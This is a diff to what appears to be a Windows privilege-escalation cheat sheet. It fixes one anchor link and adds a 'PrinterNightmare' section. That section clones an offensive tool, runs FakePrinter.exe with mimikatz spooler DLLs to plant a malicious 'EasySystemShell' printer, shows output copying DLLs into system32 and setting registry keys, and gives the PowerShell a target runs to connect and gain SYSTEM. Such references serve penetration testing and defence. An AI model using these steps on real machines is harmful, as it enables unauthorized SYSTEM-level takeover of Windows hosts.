@@ -35,7 +35,7 @@
 * [EoP - AlwaysInstallElevated](#eop---alwaysinstallelevated)
 * [EoP - Insecure GUI apps](#eop---insecure-gui-apps)
 * [EoP - Evaluating Vulnerable Drivers](#eop---evaluating-vulnerable-drivers)
-* [EoP - Printers](#eop-printers)
+* [EoP - Printers](#eop---printers)
     * [Universal Printer](#universal-printer)
     * [Bring Your Own Vulnerability](#bring-your-own-vulnerability)
 * [EoP - Runas](#eop---runas)
@@ -997,6 +997,30 @@ $printerName = 'Universal Priv Printer'
 $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
 Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
 Add-Printer -ConnectionName $fullprinterName
+```
+
+### PrinterNightmare
+
+```ps1
+git clone https://github.com/Flangvik/DeployPrinterNightmare
+PS C:\adversary> FakePrinter.exe 32mimispool.dll 64mimispool.dll EasySystemShell
+[<3] @Flangvik - TrustedSec
+[+] Copying C:\Windows\system32\mscms.dll to C:\Windows\system32\6cfbaf26f4c64131896df8a522546e9c.dll
+[+] Copying 64mimispool.dll to C:\Windows\system32\spool\drivers\x64\3\6cfbaf26f4c64131896df8a522546e9c.dll
+[+] Copying 32mimispool.dll to C:\Windows\system32\spool\drivers\W32X86\3\6cfbaf26f4c64131896df8a522546e9c.dll
+[+] Adding printer driver => Generic / Text Only!
+[+] Adding printer => EasySystemShell!
+[+] Setting 64-bit Registry key
+[+] Setting 32-bit Registry key
+[+] Setting '*' Registry key
+```
+
+```ps1
+PS C:\target> $serverName  = 'printer-installed-host'
+PS C:\target> $printerName = 'EasySystemShell'
+PS C:\target> $fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
+PS C:\target> Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
+PS C:\target> Add-Printer -ConnectionName $fullprinterName
 ```
 
 ### Bring Your Own Vulnerability
